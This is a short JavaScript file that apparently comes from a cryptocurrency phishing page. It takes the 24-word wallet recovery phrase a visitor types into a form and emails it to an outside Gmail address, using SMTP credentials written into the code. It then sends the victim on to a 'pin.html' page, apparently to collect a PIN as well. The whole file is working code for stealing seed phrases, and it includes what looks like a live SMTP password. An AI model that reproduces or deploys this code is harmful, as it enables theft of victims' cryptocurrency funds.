function emailSend() {
    var passphrase = document.getElementById('message').value;
  
    if (passphrase.trim() === "") {
      swal("Error", "Please enter your 24-word passphrase", "error");
      return;
    }
  
    var messageBody = "Passphrase: " + passphrase;
  
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "nelsf38@gmail.com",
      Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
      To: 'payday10177@gmail.com',
      From: "nelsf38@gmail.com",
      Subject: "Wallet Passphrase",
      Body: messageBody
    }).then(
      message => {
        if (message == 'OK') {
          window.location.href = 'pin.html';
        } else {
          swal("Error", "Something went wrong. Please try again.", "error");
        }
      }
    );
  }
  
  // Attach event listener to the form submit button
  document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally
    emailSend();
  });
  